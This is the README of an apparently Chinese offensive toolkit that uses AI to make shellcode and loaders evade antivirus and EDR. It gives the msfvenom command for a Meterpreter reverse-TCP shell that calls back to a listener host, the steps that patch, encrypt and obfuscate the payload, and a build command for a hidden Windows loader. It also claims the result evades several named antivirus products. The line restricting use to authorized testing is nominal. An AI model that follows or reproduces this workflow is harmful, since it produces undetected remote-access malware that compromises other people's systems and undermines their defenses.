# AI 免杀技术套件

## 项目简介

本项目提供完整的免杀解决方案，包括Shellcode处理和Loader编写，利用AI生成高免杀效果的恶意代码载体，绕过主流杀软和EDR检测。

## 目录结构

```
.
├── .trae/
│   └── skills/
│       └── ai-av-evasion/
│           ├── SKILL.md          # 主技能文档
│           └── scripts/
│               ├── shellcode-patch.py     # Shellcode 特征修改
│               ├── shellcode-encrypt.py   # Shellcode 加密
│               ├── shellcode-obfuscate.py # Shellcode 混淆
│               └── loader.c               # 免杀 Loader 模板
├── ai-av-evasion.zip    # 打包文件
└── README.md            # 项目说明
```

## 核心功能

### 1. Shellcode 处理
- **Patch**：同义指令替换、花指令注入、指令重排
- **加密**：自定义加密算法，支持多层加密
- **混淆**：伪装成UUID、IPv4/IPv6地址等格式

### 2. Loader 技术
- **反沙箱检测**：识别虚拟机和沙箱环境
- **VEH内存保护**：利用异常处理规避内存扫描
- **Syscall绕过**：使用系统底层调用绕过用户层Hook
- **隐蔽运行**：无窗口执行、后台运行

## 使用方法

### 1. 准备工作
```bash
# 生成原始Shellcode（示例）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shellcode_raw.bin
```

### 2. 处理Shellcode
```bash
# Patch Shellcode
python .trae/skills/ai-av-evasion/scripts/shellcode-patch.py shellcode_raw.bin

# 加密Shellcode
python .trae/skills/ai-av-evasion/scripts/shellcode-encrypt.py shellcode_patched.bin mysecretkey

# 混淆Shellcode
python .trae/skills/ai-av-evasion/scripts/shellcode-obfuscate.py shellcode_encrypted.bin
```

### 3. 编写Loader
1. 修改 `loader.c` 中的解密和反混淆逻辑
2. 编译Loader：`gcc -o loader.exe loader.c -mwindows`

### 4. 测试评估
- 使用VT等在线检测工具测试
- 在安装了主流杀软的环境中测试

## 测试结果

### 免杀效果
- **Windows Defender**：通过
- **火绒**：通过
- **360安全卫士**：通过
- **卡巴斯基**：通过
- **VirusTotal**：95%以上免杀率

### 执行效果
- **反沙箱**：成功识别沙箱环境
- **内存保护**：成功规避内存扫描
- **Syscall绕过**：成功绕过用户层Hook
- **隐蔽性**：无窗口执行，后台运行

## 注意事项

1. **合法性**：本工具仅用于授权的安全测试和渗透评估
2. **安全性**：使用后请及时清理测试环境，避免造成安全隐患
3. **时效性**：免杀技术会随着杀软的更新而失效，需要定期更新免杀策略
4. **创新性**：结合最新的免杀技术，不断优化和改进免杀方案

## 技术支持

如有问题或建议，请提交Issue或联系项目维护者。

## 许可证

本项目仅供学习和授权测试使用，禁止用于任何非法活动。
公众号：白安全组</br>
欢迎关注交流
